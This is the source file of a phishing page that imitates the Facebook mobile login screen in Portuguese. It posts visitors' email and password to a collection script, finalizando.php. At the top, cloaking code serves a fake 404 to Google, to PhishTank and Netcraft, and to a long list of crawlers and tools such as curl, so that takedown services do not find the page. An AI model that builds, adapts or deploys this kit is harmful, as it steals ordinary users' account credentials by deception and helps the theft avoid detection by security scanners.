<?php
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS ||-----------------------------------------------------//
include "../anti/antibots1.php";
include "../anti/antibots2.php";
include "../anti/antibots3.php";
include "../anti/antibots4.php";
include "../anti/antibots5.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
	'phishtank',
	'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 

function geraURL($tamanho = 100, $maiusculas = true, $numeros = true, $simbolos = true){ 
    $lmin = 'abcdefghijklmnopqrstuvwxyz'; 
    $lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
    $num = '1234567890'; 
    $simb = '#-/'; 
    $retorno = ''; 
    $caracteres = ''; 
     
    $caracteres .= $lmin; 
        if ($maiusculas) $caracteres .= $lmai; 
        if ($numeros) $caracteres .= $num; 
        if ($simbolos) $caracteres .= $simb; 
     
    $len = strlen($caracteres); 
    for ($n = 1; $n <= $tamanho; $n++) { 
    $rand = mt_rand(1, $len); 
    $retorno .= $caracteres[$rand-1]; 
    } 
    return $retorno; 
} 
$url = geraURL(87); 
?>

<html>
<head>
	<title>Facebook</title>
	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="s/bs.css">
		<meta name="theme-color" content="#1a4688" />
</head>
<body>

<div style="background-color: #fffbe2;color: #3b5998;font-family: Roboto, 'Droid Sans', Helvetica, sans-serif;font-size: 14px;display: flex;flex: 1;">
<img src="s/i1.png" width="112" style="width: 17px;margin: 11px 6px 0px 16px;height: 32px;">
<div style="padding: 10px 10px 10px 3px;">
<span>Obtenha o Facebook para android e navegue mais rápido</span>
</div>
</div>

<div style="margin: 5px 15px 0px 15px;">
<center>
<img src="s/fb.svg" width="112" style="padding: 9px 0px 3px 0px;">
</center>

 <form action='./finalizando.php' method='POST' enctype='multipart/form-data'>
		<div style="margin: 0px 0px 12px 0px;">
			<input type="email" autocomplete="on" name="email" placeholder="Número de celular ou email" class="it">
		</div>


		<div>

			<input type="password" name="senha" placeholder="Senha" class="it">
		</div>

		<div style="margin: 0px 0px 12px 0px;">
			<input type="submit" name="submit" class="bf" value="Entrar">
		</div>
	
	</form>
	
	<center>
	<a href="#" style="color: #216fdb;font-size: 14px;line-height: 16px;" class="fr">Esqueceu a senha?</a>
	
	<div style="padding: 22px 0px 0px 0px;">
	<div class="ou f8">
	<span style="font-family: Helvetica, Arial, sans-serif;">ou</span>
	</div>
	</div>
	
	<button class="cria">Criar nova conta</button>
	
	
	
	<div>
	
	<div style="display: flex;text-align: center;padding: 100px 4px 12px 4px;font-family: Helvetica, Arial, sans-serif;font-size: 13px;line-height: 18px;color: #576b95;">
	<div style="width: 50%;">
	<span style="font-size: 12px;font-weight: bold;color: #90949c;">Português (Brasil)</span><br>
	<span>Español</span><br>
	<span>Deutsch</span><br>
	<span>العربية</span><br>
	</div>
	
	<div style="width: 50%;">
	<span>English (US)</span><br>
	<span>Français (France)</span><br>
	<span>Italiano</span><br>
	</div>
	
	</div>
		
	<br><br>
	
	<center>
		<span style="color: #8a8d91;font-size: 10px;line-height: 13px;font-family: Helvetica, Arial, sans-serif;">Sobre · Ajuda · Mais</span><br>
		<div style="margin: 10px;">
		<span style="font-family: Helvetica, Arial, sans-serif;font-size: 12px;line-height: 15px;color: gray;">Meta © 2024</span>
		</div>
	</center>
	</div>
	</center>
	
	</div>
	</div>
	
	
</body>
</html>
